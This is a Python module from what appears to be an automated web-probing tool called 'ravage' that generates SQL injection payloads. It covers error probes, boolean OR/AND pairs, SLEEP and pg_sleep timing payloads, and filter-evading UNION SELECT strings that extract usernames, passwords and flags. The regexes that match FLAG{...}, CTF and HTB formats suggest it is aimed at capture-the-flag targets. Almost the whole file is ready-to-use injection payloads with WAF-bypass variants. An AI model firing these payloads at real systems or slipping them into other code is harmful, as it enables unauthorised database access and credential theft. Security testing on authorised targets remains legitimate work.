from __future__ import annotations

import re

from ravage.probe_suite_parts.sqli.sqli_values import _sqli_baseline_value, _target_baseline_value
from ravage.probe_suite_parts.support import _dedupe
from ravage.web_core.proof_recognizer import recognize_proofs

_SQLI_TIMING_DELAY_SECONDS = 2

def _preg_match_subject_payloads() -> list[str]:
    return _dedupe(
        [
            "admin",
            "Admin",
            "administrator",
            "root",
            "user",
            "guest",
            "flag",
            "FLAG",
            _proof_subject("FLAG", ""),
            _proof_subject("FLAG", "0"),
            _proof_subject("FLAG", "test"),
            _proof_subject("FLAG", "admin"),
            _proof_subject("FLAG", "0" * 32),
            _proof_subject("FLAG", "a" * 32),
            _proof_subject("FLAG", "0" * 40),
            _proof_subject("FLAG", "a" * 40),
            _proof_subject("FLAG", "0" * 64),
            _proof_subject("CTF", "test"),
            _proof_subject("flag", "test"),
        ]
    )

def _proof_subject(prefix: str, body: str) -> str:
    return f"{prefix}{{{body}}}"

def _synthetic_proof_subject(value: str) -> bool:
    lowered = value.lower()
    if recognize_proofs(value):
        return True
    return bool(re.search(r"\b(?:flag|ctf|htb)\{[^}]*\}", lowered))

def _extract_user_exists_value(body: str) -> str:
    match = re.search(r"User exists:\s*([^<\r\n]{1,260})", body, flags=re.IGNORECASE)
    if match is None:
        return ""
    return match.group(1).strip()

def _sqli_error_payloads_for_target(target: dict[str, object]) -> list[str]:
    return _sqli_error_payloads(str(target.get("input") or ""), baseline=_target_baseline_value(target))

def _sqli_error_payloads(name: str, *, baseline: str | None = None) -> list[str]:
    baseline = baseline or _sqli_baseline_value(name)
    return ["'", '"', "\\", f"{baseline}'", f"{baseline}\"", "')", "\")"]

def _sqli_boolean_payloads_for_target(target: dict[str, object]) -> list[tuple[str, str]]:
    return _sqli_boolean_payloads(str(target.get("input") or ""), baseline=_target_baseline_value(target))

def _sqli_boolean_payloads(name: str, *, baseline: str | None = None) -> list[tuple[str, str]]:
    baseline = baseline or _sqli_baseline_value(name)
    numeric = baseline.isdigit()
    pairs = [
        ("1 OR 1=1", "1 AND 1=2"),
        ("1/**/OR/**/1=1", "1/**/AND/**/1=2"),
        ("1)/**/OR/**/(1=1", "1)/**/AND/**/(1=2"),
        ("1 OR TRUE", "1 AND FALSE"),
        ("1) OR (1=1", "1) AND (1=2"),
        ("1' OR '1'='1", "1' AND '1'='2"),
        ("1' OR '1'='1' -- ", "1' AND '1'='2' -- "),
        ("1'/**/OR/**/'1'='1'-- -", "1'/**/AND/**/'1'='2'-- -"),
        ("1\" OR \"1\"=\"1", "1\" AND \"1\"=\"2"),
        ("1\" OR \"1\"=\"1\" -- ", "1\" AND \"1\"=\"2\" -- "),
        (f"{baseline}' OR '1'='1", f"{baseline}' AND '1'='2"),
        (f"{baseline}' OR '1'='1' -- ", f"{baseline}' AND '1'='2' -- "),
        (f"{baseline}'/**/OR/**/'1'='1'-- -", f"{baseline}'/**/AND/**/'1'='2'-- -"),
        (f"{baseline}') OR ('1'='1", f"{baseline}') AND ('1'='2"),
        (f"{baseline}\" OR \"1\"=\"1", f"{baseline}\" AND \"1\"=\"2"),
        (f"{baseline}\" OR \"1\"=\"1\" -- ", f"{baseline}\" AND \"1\"=\"2\" -- "),
        ("') OR ('1'='1", "') AND ('1'='2"),
    ]
    if numeric:
        return pairs[:6]
    return pairs[4:]

def _sqli_timing_payloads_for_target(target: dict[str, object]) -> list[str]:
    return _sqli_timing_payloads(str(target.get("input") or ""), baseline=_target_baseline_value(target))

def _sqli_timing_payloads(name: str, *, baseline: str | None = None) -> list[str]:
    baseline = baseline or _sqli_baseline_value(name)
    delay = _SQLI_TIMING_DELAY_SECONDS
    return [
        f"1 OR SLEEP({delay})",
        f"1/**/OR/**/SLEEP({delay})",
        f"1' OR SLEEP({delay})-- -",
        f"1'/**/OR/**/SLEEP({delay})-- -",
        f"{baseline}' OR SLEEP({delay})-- -",
        f"{baseline}'/**/OR/**/SLEEP({delay})-- -",
        f"1'; SELECT pg_sleep({delay})--",
        f"1'||pg_sleep({delay})--",
        f"1' OR '1'='1' AND SLEEP({delay})-- -",
    ]

def _filtered_query_payloads_for_target(target: dict[str, object]) -> list[str]:
    return _filtered_query_payloads(str(target.get("input") or ""), baseline=_target_baseline_value(target))

def _filtered_query_payloads(name: str, *, baseline: str | None = None) -> list[str]:
    baseline = baseline or _sqli_baseline_value(name)
    return _dedupe(
        [
            "%",
            f"{baseline}%",
            f"{baseline}'",
            f"{baseline}\"",
            f"{baseline}'/**/OR/**/1=1#",
            f"{baseline}\"/**/OR/**/1=1#",
            f"{baseline}'/**/OR/**/1=1-- -",
            f"{baseline}'/*!50000OR*/1=1-- -",
            f"{baseline}' oorr 1=1-- -",
            f"{baseline}' UNION SELECT 1-- -",
            f"{baseline}' UnIoN SeLeCt 1-- -",
            f"{baseline}'/**/UNION/**/SELECT/**/1-- -",
            f"{baseline}'/**/UNION/**/SELECT/**/1,CONCAT(username,0x3a,password),3/**/FROM/**/users#",
            f"{baseline}\"/**/UNION/**/SELECT/**/1,CONCAT(username,0x3a,password),3/**/FROM/**/users#",
            f"{baseline}'/**/UNION/**/SELECT/**/1,password,3/**/FROM/**/users#",
            f"{baseline}\"/**/UNION/**/SELECT/**/1,password,3/**/FROM/**/users#",
            f"{baseline}'/**/UNION/**/SELECT/**/1,flag,3/**/FROM/**/flag#",
            f"{baseline}\"/**/UNION/**/SELECT/**/1,flag,3/**/FROM/**/flag#",
            f"{baseline}'/**/UNION/**/SELECT/**/1,value,3/**/FROM/**/flags#",
            f"{baseline}\"/**/UNION/**/SELECT/**/1,value,3/**/FROM/**/flags#",
            f"{baseline}'/*!50000UNION*/ /*!50000SELECT*/ 1-- -",
            f"{baseline}' UNION SELECT username FROM users-- -",
            f"{baseline}' UNION SELECT password FROM users-- -",
            f"{baseline}' UNION SELECT flag FROM flag-- -",
            f"{baseline}' UNION SELECT value FROM flag-- -",
            f"{baseline}' UNION SELECT flag FROM flags-- -",
            f"{baseline}' UNION SELECT value FROM flags-- -",
            f"{baseline}' UNION SELECT null,flag FROM flag-- -",
            f"{baseline}' UNION SELECT null,value FROM flag-- -",
            f"{baseline}' UNION SELECT null,flag FROM flags-- -",
            f"{baseline}' UNION SELECT null,value FROM flags-- -",
            f"{baseline}' UNION SELECT null,null,flag FROM flag-- -",
            f"{baseline}' UNION SELECT null,null,value FROM flag-- -",
            f"{baseline}' UNION SELECT null,null,flag FROM flags-- -",
            f"{baseline}' UNION SELECT null,null,value FROM flags-- -",
        ]
    )[:40]
